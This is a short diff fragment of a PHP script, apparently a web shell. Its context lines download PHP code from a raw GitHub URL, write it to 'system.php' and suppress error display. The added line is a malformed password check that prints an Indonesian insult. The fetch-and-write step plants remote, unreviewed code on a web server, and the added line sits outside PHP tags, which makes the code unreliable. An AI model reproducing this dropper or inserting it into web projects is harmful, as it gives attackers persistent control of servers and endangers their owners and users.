@@ -243,6 +243,7 @@ $fp = fopen("system.php", "w");
 fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/system.php")); 
 fclose($fp); 
 ?>
+if($auth_pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center>");
 <?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
